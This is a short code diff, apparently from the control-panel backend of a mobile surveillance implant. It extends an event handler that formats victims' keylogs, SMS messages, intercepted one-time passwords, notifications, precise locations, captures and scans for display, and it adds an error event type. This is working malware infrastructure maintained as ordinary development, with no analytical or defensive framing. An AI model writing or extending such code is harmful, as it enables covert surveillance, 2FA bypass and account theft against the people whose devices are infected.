@@ -18,7 +18,7 @@ import {
 } from './deviceStore.js';
 import { insertEvent } from './eventStore.js';
 
-const EVENT_KINDS = new Set(['info', 'keylog', 'sms', 'notif', 'otp', 'location', 'capture', 'scan', 'status']);
+const EVENT_KINDS = new Set(['info', 'keylog', 'sms', 'notif', 'otp', 'location', 'capture', 'scan', 'status', 'error']);
 
 function eventText(evt: ImplantEvent): string {
   switch (evt.kind) {
@@ -26,11 +26,13 @@ function eventText(evt: ImplantEvent): string {
     case 'otp': return `🔐 OTP ${evt.code} from ${evt.source}`;
     case 'sms': return `✉ [${evt.from}] ${evt.text}`;
     case 'notif': return `🔔 ${evt.app}: ${evt.text}`;
-    case 'location': return `📍 ${evt.lat.toFixed(5)}, ${evt.lng.toFixed(5)} ±${evt.acc}m`;
-    case 'capture': return `📦 capture ${evt.type}: ${evt.ref}`;
-    case 'scan': return `🔍 scan ${evt.type}: ${JSON.stringify(evt.payload)}`;
+    case 'location': return `📍 ${evt.lat.toFixed(5)}, ${evt.lng.toFixed(5)} ±${evt.accuracy ?? '?'}m`;
+    case 'capture': return `📦 capture ${evt.type}: ${evt.url ?? 'n/a'}`;
+    case 'scan': return `🔍 scan ${evt.type}: ${JSON.stringify(evt.results)}`;
     case 'status': return `status → ${evt.status}${evt.attempts ? ` (attempt ${evt.attempts})` : ''}`;
     case 'info': return `ℹ device info updated`;
+    case 'error': return `⚠ ${evt.message}`;
+    default: return 'unknown event';
   }
 }
 
